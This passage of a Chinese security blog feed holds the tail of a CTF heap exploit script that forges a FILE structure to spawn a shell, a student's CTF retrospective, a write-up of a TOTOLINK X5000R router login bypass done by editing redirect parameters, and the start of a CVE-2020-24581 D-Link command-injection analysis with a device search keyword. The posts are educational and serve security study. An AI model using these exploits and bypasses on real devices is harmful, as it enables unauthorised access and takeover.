class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index :&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">b&#x27;aaaa&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">payload = cyclic(<span class="number">0x38</span>)+p64(<span class="number">0xfc1</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">add(<span class="number">0x1000</span>,<span class="string">b&#x27;aaaa&#x27;</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x40</span>,<span class="string">b&#x27;1&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">libc_addr = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x3c5131</span></span><br><span class="line">success(<span class="string">&quot;libc_addr :&quot;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">payload = cyclic(<span class="number">0x48</span>)+p64(<span class="number">0xf51</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x4040E0</span>+<span class="number">0x40</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0xf40</span>,<span class="string">b&#x27;aaaa&#x27;</span>)<span class="comment">#3</span></span><br><span class="line">show(<span class="number">10</span>)</span><br><span class="line">io.recv()</span><br><span class="line">heap_addr = u64(io.recv(<span class="number">4</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x22010</span></span><br><span class="line">success(<span class="string">&quot;heap_addr :&quot;</span>+<span class="built_in">hex</span>(heap_addr))</span><br><span class="line">system_addr = libc_addr + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">payload = p64(heap_addr+<span class="number">0x22010</span>)+p64(heap_addr+<span class="number">0x90</span>)*<span class="number">3</span></span><br><span class="line">edit(<span class="number">10</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">main_arena = libc_addr + <span class="number">0x3c4b20</span>+<span class="number">88</span></span><br><span class="line">payload = cyclic(<span class="number">0x48</span>)+p64(<span class="number">0xf51</span>)+p64(main_arena)*<span class="number">2</span></span><br><span class="line">edit(<span class="number">2</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">b&#x27;aaaa&#x27;</span>)<span class="comment">#4</span></span><br><span class="line">IO_list_all = libc_addr + libc.sym[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">payload = cyclic(<span class="number">0x30</span>) <span class="comment">#填充到old top chunk</span></span><br><span class="line">fake_file = <span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="number">0x60</span>) <span class="comment">#覆盖size 使其释放到smallbin 0x60链表</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)+p64(IO_list_all-<span class="number">0x10</span>) <span class="comment">#伪造bk域</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)+p64(<span class="number">1</span>) <span class="comment">#布局io_write_ptr和io_write_base</span></span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0xc0</span>,<span class="string">b&#x27;\x00&#x27;</span>) <span class="comment">#填充偏移</span></span><br><span class="line">payload += fake_file + p64(<span class="number">0</span>)*<span class="number">3</span>+p64(heap_addr+<span class="number">0x1a8</span>)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(system_addr) <span class="comment">#伪造vtable结构体</span></span><br><span class="line">edit(<span class="number">4</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">io.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Size :&quot;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">0x30</span>))</span><br><span class="line">io.interactive()</span><br><span class="line"><span class="comment"># debug()</span></span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> extra </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>大一总结</title>
      <link href="/2023/08/24/%E5%A4%A7%E4%B8%80%E6%80%BB%E7%BB%93/"/>
      <url>/2023/08/24/%E5%A4%A7%E4%B8%80%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h2 id="碎碎念"><a href="#碎碎念" class="headerlink" title="碎碎念"></a>碎碎念</h2><p>岁月匆匆 一转眼的瞬间 大一就要结束了 回顾去年的所作所为 有满意的地方也有不尽人意的 时至今日 也无法改变什么了 很喜欢漂流少年的一句台词 就以这句台词来开启本篇总结吧</p><p><strong>人生就是一场无尽的徒劳 但是 正是因为毫无意义 我才会觉得活着的这个瞬间 这份辉煌很可贵 因为这是此时此刻 只属于我的东西</strong></p><h2 id="为什么打CTF"><a href="#为什么打CTF" class="headerlink" title="为什么打CTF"></a>为什么打CTF</h2><p>这个问题或许解释成 为什么想打竞赛比较好 在高考结束后的那个暑假 我第一次对于人生有了看法 考上好大学是为了什么? 老师父母都会跟我说这是对自己的人生负责 为了过上好日子 所以好大学&#x3D;好人生？为了找到这个问题的答案 我喜欢骑着自行车穿梭在城市的各个角落 这也是现在公路车这个爱好的起源 看那些不同阶级的人 一天中的不同时间 不同地方 能看到不同的人生</p><p>依稀记得是七月份的某天凌晨 实在是睡不着 于是说决定去骑车看看这座城市早上的样子吧 最开始看到的是三四点骑着三轮载着菜赶往早市的大妈  晚些时候 路过了建筑工地 看到的是扛起了整个家庭的父亲 找了一家靠近工地的早餐店 看着来来往往的工人和早班的白领 第一次对于人生有了比较大的感悟 这是以前在学校的环境中所体会不到的 对于<strong>钱</strong>这一概念 更加深刻了 </p><p>后来 高考成绩出了 意外的收获了最好的一次 不过最后也还是来了福建师范大学 要说满意呢 其实也没有 一直以来都在给自己一个借口 我只不过是学的时间比较短 高三才开始认真学 如果早点学我可以去更好的学校 这样的借口来麻痹自己 给予自己我很聪明的假象 所以 我打算从一开始就认真一次 我想看看自己的极限在哪里 如果我努力到了在本校前列 我就和同样是双非的比较 如果我到了这一层次的前列 我就继续向上看齐 我想看看自己的极限在哪里</p><p>这种对于自己高考成绩的不甘心 以及萌生的对于钱的认知 我下定决心 在大学的期间 我的努力要让我赚到钱 在当时的我看来 一个人的出息与否 等同于他能赚到的钱</p><p>浅薄的认知告诉我 进大厂&#x3D;赚大钱 而双非本科的学历属实是不够看 所以提升简历 就放在了第一位 由此想到了通过竞赛来提升简历 这也是最开始 一加到新生群 就询问acm相关的事项(当时哪里知道还有个ctf</p><p>大概是在本校的oj刷了七十多道题吧  专业最后也是知晓了 网络空间安全 一开始选择这个专业呢 一方面是当时报考的想到传统的程序员的竞争压力会不会过大 所以选择了另外一条赛道 其实这种避开卷的赛道思想也出现在高二选择了物化地上面</p><p>总之 了解了过后 才知道acm对于网络空间安全的帮助没有那么大 同时两个比赛一起打 如果不是天才的话 只会两个水平都一般 所以最后是选择了打ctf</p><h2 id="为什么走pwn方向"><a href="#为什么走pwn方向" class="headerlink" title="为什么走pwn方向"></a>为什么走pwn方向</h2><p>一方面呢也是因为我想避开竞争压力大的赛道 也就是选择的人多的web方向</p><p>一方面也是实际做题下来 发现其他方向用到的工具太多了 知识点也很繁杂 而且做出题的思路我不是很喜欢</p><p>总感觉是偏向于脑洞 相比较 pwn的对于漏洞思想的考察 我就很喜欢这种节奏 在学习起效了以后 经常会自发性的研究漏洞 自己鼓捣一些利用方式</p><h2 id="学习途中帮助很大的人！"><a href="#学习途中帮助很大的人！" class="headerlink" title="学习途中帮助很大的人！"></a>学习途中帮助很大的人！</h2><p>第一位启蒙导师 应该要属本校的acm学长 阿凌 也是最开始acm猛刷七十多道题的时候认识的 由于涉及个人隐私 这里不方便说他的经历  但是他背水一战的经历 在直到现在的很多时候 都能给予我坚持的动力应该来说 对于大学四年的安排 是他第一个给了我大概的规划 因为是家中三代第一个大学生 对于大学是一个什么样的存在 其实不是很清楚 然后对于就业的一些浅薄的认知 也是听闻他</p><p>第二位 当属在高三暑假学习pwn中认识的外校学长 幽林师傅 时至今日 一些解决不了的问题 也是经常请教 特别是在学习的初期阶段 很多弱智问题 幽林师傅都耐心的解答了 特表感激！</p><p>第三位 也是帮助最大的一位 外校的xiaobin学长 应该是九月初认识的 当初是因为询问本校的历年校赛 是他出的 从而有了联系 最后靠xiaobin师傅的提拔和器重 也是有了很多机会 间接和本校的学长熟络了 也认识了很多外校厉害的学长 可以说是开阔了视野 同时也十分感激有一晚的手把手教学动态调试 到现在 每次做题 也是最喜欢动态调试的过程 有一种自己发掘到程序的最底层原理的快感</p><p>第四位 应该属本校的各位学长 引导了初期对于ctf赛事的认知 以及未来就业或者是读研的情况  更是带着我这个饭桶 一路杀到了国赛总决赛！直接开始可汗大点兵(排名不分先后 邵学长 李学长  林学长 陈学长 谢学长等等 以及协会的所有学长学姐！</p><p>第五位 留给在学习途中 给予我各种各样帮助的师傅! 没有他们的帮助就没有现在的我(草 说的跟获奖感言一样 不过是发自肺腑的</p><h2 id="大一的CTF总结"><a href="#大一的CTF总结" class="headerlink" title="大一的CTF总结"></a>大一的CTF总结</h2><p>对于我一个零基础 在大学前 接触电脑只有玩过minecraft和4399的来说 上来就是从二进制方向入门 属实够呛 对于什么虚拟地址啊 寄存器啊都是一头雾水 大一上学期的学习只能说是一塌糊涂 学习的进度非常缓慢 应该是停留在模板化的利用栈以及低版本的堆</p><p>对于漏洞的利用灵活起来 应该是在西湖论剑 也是第一场有输出的大赛 其前两题都是关于栈的灵活应用 在赛后复现完并且吃透了以后 对于栈的利用帮助非常大 也是自那以后 开始萌生了对于漏洞利用的思考 </p><p>到了大一下学期 由于本校的陈学长推荐 面试了联合战队vn 也是属于ctf生涯中比较大的一个转折点 从原本的圈子中跳了出来 认识到了原来还有这么多厉害的人 意识到了和他们之间的差距 一直都是我向上努力追赶的动力 同时由于vn战队和安恒有出题方面的合作 因此我赚到了大学的第一桶金</p><p>随后就是比较重要的两场比赛吧 福建省的省赛黑盾杯 以及国赛CISCN 前者呢 是一直听xiaobin学长说已经两年pwn零解了 所以对于当时的我来说 如果打破了这个诅咒 就是我厉害的地方了哈哈(还记得在最初版的博客里有一句话 打破不可能 说的就是这个  也是非常没有辜负自己的期望 在今年的黑盾杯复赛 成功拿下了pwn题目的一血！ </p><p>国赛CISCN 也是一路打到了决赛 最后拿下了全国三等奖 不过这个比赛更多靠的是学长的带飞 这里就不邀功了233 一笔带过</p><p>其他的小比赛呢 更多的是其他学校的举报的校赛或者是联合战队举办的比赛 这里做个大概的总结吧</p><p><strong>1.ISCTF2022 新生赛道一等奖(laffey✌带飞的 我是混逼)</strong></p><p><strong>2.skynico2022 总榜第七 二等奖(个人赛 虽然我感觉也很水)</strong></p><p><strong>3.GDOUCTF2023 外校赛道第五名 三等奖(跟着vn的师傅打的 我是混逼)</strong></p><p><strong>4.NISA2023 总榜第二 一等奖 (师大自己办的校赛 运气好)</strong></p><p><strong>5.NEEPUCTF2023 外校赛道第八名 三等奖(个人赛 打的师傅比较少 捡漏233)</strong></p><p><strong>6.LITCTF2023 外校赛道第七名 二等还是三等来着忘了 (跟着vn的师傅打的 我是混逼)</strong></p><p><strong>7.CISCN2023 华东南分区赛一等奖(学长带飞 不过我有点输出 欸嘿 特别是抢了一题一血 因为那题简直就是我的出题方式低配版)</strong></p><p><strong>8.CISCN2023 总决赛三等奖 （别说了 恰保底 而且更多的锅在我身上 是真爆零了 题目策略的问题 第二天复现的时候一小时就把一题做出来的 如果我出了说不定就不用恰保底了 草）</strong></p><p><strong>9.NepNepctf2023 总榜19名 三等奖(分值设置的比较不合理 运气好捡漏)</strong></p><p><strong>10.ISCC2023 三等奖 (草 写这个单纯为了凑到十个好看点 写出来的时候我都笑了 什么鸡儿奖项)</strong></p><h2 id="对于未来的规划"><a href="#对于未来的规划" class="headerlink" title="对于未来的规划"></a>对于未来的规划</h2><p>一年下来呢 目前的水平其实比较尴尬 跟金字塔尖的大佬差的实在有点多 不上不下 不过由于今年跟着学长混了个国三 我个人认为ctf这块对于简历的帮助已经差不多了 未来不会再花太多精力在这上面 应该是算半退役 未来更多的时间呢 我希望学好英语 不单单是为了过四六级 也是对于更远的未来的一种保底的打算 以及学好iot方向 这是我在众多二进制就业方向中选择的一个比较感兴趣的方向 希望能在大二时挖到第一个CVE!</p><p>然后就是十分笼统的对于性格方面的期待啦 希望自己一直保持向上看齐的乐观心态 时刻对自己的菜狗水平有认知 不骄不躁的完成既定的目标</p><h2 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h2><p>洋洋洒洒的写了三千多字 废话也是比较多 关于人生的思考 我也是明白一点了 正应罗翔老师说过的 人生就像是一场电影 我们没有办法决定我们的剧本 我们的出生 我们的智商等等 但是哪怕你手里的牌再差 也只能尽力去打</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> something to say </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ToToLink-X5000R登录绕过</title>
      <link href="/2023/08/15/ToToLink-X5000R%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87/"/>
      <url>/2023/08/15/ToToLink-X5000R%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>跟着看雪上的这位师傅复现的 <a href="https://www.kanxue.com/chm.htm?id=17830">https://www.kanxue.com/chm.htm?id=17830</a> </p><p>好文章 学到了面对一个路由器时的分析思路</p><h2 id="模拟"><a href="#模拟" class="headerlink" title="模拟"></a>模拟</h2><p>固件下载地址<a href="http://www.totolink.cn/home/menu/newstpl.html?menu_newstpl=products&id=65">http://www.totolink.cn/home/menu/newstpl.html?menu_newstpl=products&amp;id=65</a></p><p>mipsel架构  模拟脚本</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#/bin/sh</span><br><span class="line">sudo tunctl -t top0 -u root</span><br><span class="line">sudo ifconfig top0 192.168.6.2</span><br><span class="line">sudo qemu-system-mipsel -M malta -kernel ./mipsel_kernel/vmlinux-3.2.0-4-4kc-malta -hda ./mipsel_kernel/debian_squeeze_mipsel_standard.qcow2 -append &quot;root=/dev/sda1 console=tty0&quot; -net nic -net tap,ifname=top0 -nographic</span><br></pre></td></tr></table></figure><p>模拟起来后 进入其中配置eth0网络接口与top0位于同一c段</p><p>随后打包squashfs-root文件夹 通过scp上传到模拟系统中</p><p>以squashfs-root文件夹为根目录</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chroot ./squashfs-root/ /bin/sh</span><br></pre></td></tr></table></figure><p>随后启动路由器服务</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./usr/sbin/lighttpd -f ./lighttp/lighttpd.conf</span><br></pre></td></tr></table></figure><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308151842851.png" title="image-20230815184214754" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308151842851.png" alt="image-20230815184214754"></a></p><p>会因为找不到文件而报错 </p><p>直接在对应目录下创建一个空文件就可以了</p><p>成功启动服务</p><h2 id="固件分析"><a href="#固件分析" class="headerlink" title="固件分析"></a>固件分析</h2><p>首先我们要清楚 我们要从哪个方向来分析这个路由器  这一点是至关重要的 不能漫无目的</p><p>我们选择针对登录这一点来分析 首先试着随便输入密码 并且通过抓包来查看登录检测涉及到了哪些文件</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308151848154.png" title="image-20230815184817104" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308151848154.png" alt="image-20230815184817104"></a></p><p>可以看到 密码的发送是通过这个包来进行的</p><p>同时你可以注意到状态是302 这意味着服务器返回了重定向响应 来看一下跳转的地址是什么</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308151848830.png" title="image-20230815184849802" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308151848830.png" alt="image-20230815184849802"></a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.6.1/formLoginAuth.htm？authCode=0&amp;userName=&amp;goURL=phone/login.html&amp;action=login&amp;flag=1</span><br></pre></td></tr></table></figure><p>有着比较多的参数 应该是用来判断用户的密码是否正确 我们找到这个包对应的cgi文件</p><p>搜索username字符串 尝试找到对应的代码</p><p>发现了sub_42A2D0函数 其功能似乎是根据其他参数来决定重定向的网址 来看下面的代码</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308151931810.png" title="image-20230815193100787" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308151931810.png" alt="image-20230815193100787"></a></p><p>根据v9来判断重定向的网址 这里猜测应该是flag这个参数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.6.1/formLoginAuth.htm?authCode=0&amp;userName=&amp;goURL=phone/login.html&amp;action=login&amp;flag=ie8</span><br></pre></td></tr></table></figure><p>通过单独修改flag为ie8 最后成功重定向到了login_ie.html 证实了猜想 但是好像没有什么软用</p><p>接下来想的是为www目录下找到formLoginAuth.htm这个网址 但是好像没有 那么就去lighttpd这个文件来看看</p><p>可以看到 根据不同的网址来进入不同的函数 我们来跟进到form_login函数中</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308151935557.png" title="image-20230815193537526" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308151935557.png" alt="image-20230815193537526"></a></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v8 )</span><br><span class="line">  &#123;</span><br><span class="line">    fbss = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v13 = time(<span class="number">0</span>);</span><br><span class="line">      <span class="keyword">if</span> ( !ws_get_cookie(a1, <span class="string">&quot;SESSION_ID&quot;</span>, v16, <span class="number">0</span>) &amp;&amp; form_get_idx_by_sessionid(&amp;fl_sess, v13, v16) != <span class="number">-1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">sprintf</span>(a2, <span class="string">&quot;http://%s/%s?timestamp=%ld&quot;</span>, v23, v20, v13);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">sprintf</span>(v15, <span class="string">&quot;%ld:%d&quot;</span>, v13, <span class="number">2</span>);</span><br><span class="line">      <span class="built_in">sprintf</span>(v19, <span class="string">&quot;%d:%s&quot;</span>, <span class="number">2</span>, v15);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( form_get_idx_by_sessionid(&amp;fl_sess, v13, v19) != <span class="number">-1</span> );</span><br><span class="line">    <span class="keyword">if</span> ( !v6 )</span><br><span class="line">      v6 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> ( form_add_session(&amp;fl_sess, &amp;fl_sess_bak, <span class="number">-1</span>, v17, v6, v19, <span class="number">2</span>, v13) )</span><br><span class="line">    &#123;</span><br><span class="line">      ws_set_cookie(a3, <span class="string">&quot;SESSION_ID&quot;</span>, v19, <span class="number">0</span>, <span class="string">&quot;/&quot;</span>, <span class="number">0</span>);</span><br><span class="line">      <span class="built_in">sprintf</span>(a2, <span class="string">&quot;http://%s/%s?timestamp=%ld&quot;</span>, v23, v20, v13);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ws_clear_cookie(a3, <span class="string">&quot;SESSION_ID&quot;</span>, <span class="string">&quot;/&quot;</span>);</span><br><span class="line">    fbss = <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(&amp;v14, <span class="string">&quot;ie8&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">sprintf</span>(a2, <span class="string">&quot;http://%s%s&quot;</span>, v23, <span class="string">&quot;/login_ie.html&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( atoi(&amp;v14) == <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">sprintf</span>(a2, <span class="string">&quot;http://%s%s%s&quot;</span>, v23, <span class="string">&quot;/phone&quot;</span>, <span class="string">&quot;/login.html&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">sprintf</span>(a2, <span class="string">&quot;http://%s%s&quot;</span>, v23, <span class="string">&quot;/login.html&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>这里可以看到对于v8的值进行了判断 如果不为0则进入if分支 可以看到对于a2进行了操作 </p><p>而我们看到下面 a2应该是重定向的地址</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308151948757.png" title="image-20230815194828730" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308151948757.png" alt="image-20230815194828730"></a></p><p>那么v8的值怎么来的呢  可以看到应该是跟authcode的参数有关系 那么我们将authcode修改为1后试试</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308151949150.png" title="image-20230815194901122" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308151949150.png" alt="image-20230815194901122"></a></p><p>结果发现还是跳转回到login.html页面  但是参数确实多了个timestamp</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308151950240.png" title="image-20230815195043221" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308151950240.png" alt="image-20230815195043221"></a></p><p>这里应该是由于我们重定向导致的 但是将flag删除掉 也没有办法 因为会进入最后的else分支 默认重定向到&#x2F;login.html</p><p>但是我们仔细观察一下参数 还是有一个叫做goURL的 我们把这个参数删除掉后</p><p>成功绕过了登录 进入了后台</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308151952062.png" title="image-20230815195258957" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308151952062.png" alt="image-20230815195258957"></a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> iot </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2020-24581</title>
      <link href="/2023/08/09/CVE-2020-24581/"/>
      <url>/2023/08/09/CVE-2020-24581/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>参照资料<a href="https://www.anquanke.com/post/id/229323#h3-5">https://www.anquanke.com/post/id/229323#h3-5</a></p><p>比较简单的一个CVE 且不需要模拟路由器环境 适合第一次接触iot的萌新(就比如我</p><p>同时由于我的网络基础知识薄弱 有些地方也是网络上查资料的 可能存在错误</p><p><strong>漏洞路由器型号:D-Link DSL-2888A</strong></p><p><strong>漏洞编号: CVE-2020-24581</strong></p><p><strong>fofa搜索关键词: body&#x3D;DSL-2888A</strong></p><p><strong>漏洞影响版本:  AU_2.31_V1.1.47ae55之前的版本</strong></p><p><strong>固件下载: <a href="https://www.dlink.com.sg/dsl-2888a/">https://www.dlink.com.sg/dsl-2888a/</a></strong></p><h1 id="逻辑分析"><a href="#逻辑分析" class="headerlink" title="逻辑分析"></a>逻辑分析</h1><p>首先要清楚 漏洞产生的原因是因为execute_cmd.cgi文件存在任意的参数执行</p><p>为了捋清楚漏洞的本质 我们要定位到以下两个重点</p><p><strong>1.如何执行到execute_cmd.cgi文件</strong></p><p><strong>2.如何赋值execute_cmd.cgi的参数</strong></p><h2 id="如何执行到execute-cmd-cgi文件"><a href="#如何执行到execute-cmd-cgi文件" class="headerlink" title="如何执行到execute_cmd.cgi文件"></a>如何执行到execute_cmd.cgi文件</h2><p>&#x2F;etc&#x2F;rc.d&#x2F;rcS是Linux系统中负责系统初始化以及启动相关任务的脚本</p><p>本次漏洞是由web服务触发的 所以我们需要跟进到路由器负责web服务的二进制文件 通过&#x2F;etc&#x2F;rc.d&#x2F;rcS脚本 可以定位到是dhttpd</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if [ -e &quot;/usr/sbin/onetouch&quot; ]; then</span><br><span class="line">dxml -n dbros -t &amp;</span><br><span class="line">sleep 1</span><br><span class="line">dxmlc -l /usr/script/onetouch/dlink.xml</span><br><span class="line">sleep 1</span><br><span class="line">/usr/script/onetouch/sync_device.sh</span><br><span class="line">/usr/script/onetouch/sync_wan.sh</span><br><span class="line">/usr/script/onetouch/sync_wlan.sh</span><br><span class="line">/usr/script/onetouch/sync_wlan5g.sh</span><br><span class="line"></span><br><span class="line">dhttpd &amp;</span><br><span class="line">killall onetouch</span><br><span class="line">onetouch &amp;</span><br><span class="line">fi</span><br></pre></td></tr></table></figure><p>通过find命令 可以定位到位于&#x2F;usr&#x2F;sbin&#x2F;dhttpd目录<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308092019177.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308092019177.png" alt="image.png"></a><br>发现是32位的ARM架构的文件<br>随后我们需要定位到dhttp文件中负责调用execute_cmd.cgi文件的函数<br>先来搞明白cgi文件是什么 CGI (Common Gateway Interface) 文件是一种通用的网页编程技术 用于在Web服务器上执行可执行程序或脚本<br>其存放在jffs2-root&#x2F;www&#x2F;cgi-bin&#x2F;目录下<br>所以我们尝试在ida中搜索cgi-bin字符串 就可以跟着定位到sub_9C4C函数<br>该函数用来加载web和cgi组件<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308092106592.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308092106592.png" alt="image.png"></a><br>我们可以进一步跟进到sub_BEA0函数<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308092101331.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308092101331.png" alt="image.png"></a><br>这里进行调用cgi文件前的相关check和初始化<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308092102855.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308092102855.png" alt="image.png"></a><br>在后面可以看到 需要相关的环境变量来启动cgi文件<br>可以看到有REMOTE_USER的变量 说明可能需要<br>随后调用了sub_BB5C函数执行cgi文件</p><h2 id="如何赋值execute-cmd-cgi的参数"><a href="#如何赋值execute-cmd-cgi的参数" class="headerlink" title="如何赋值execute_cmd.cgi的参数"></a>如何赋值execute_cmd.cgi的参数</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">. /usr/syscfg/api_log.sh</span><br><span class="line">cmd=`echo $&#123;QUERY_STRING&#125; | cut -d = -f 3` </span><br><span class="line">cmd=`echo $&#123;cmd&#125; |tr &quot;%20&quot; &quot; &quot;` </span><br><span class="line">result=`$&#123;cmd&#125;`  </span><br><span class="line">TGP_Log $&#123;TGP_LOG_WARNING&#125; &quot;cmd=$&#123;cmd&#125;, result=$&#123;result&#125;&quot;</span><br><span class="line">echo  &quot;Content-type: text/html&quot;</span><br><span class="line">echo  &quot;&quot;</span><br><span class="line">echo -n $&#123;result&#125;</span><br></pre></td></tr></table></figure><p>通过分析其内容 可以看到cmd参数是根据QUERY_STRING环境变量的第三个字段来的 其分割符是‘&#x3D;’<br>那么我们此时来遍历一下目录下的所有文件 看看QUERY_STRING环境变量的内容</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">search_files</span>(<span class="params">directory, target_string</span>):</span><br><span class="line">    <span class="keyword">for</span> root, dirs, files <span class="keyword">in</span> 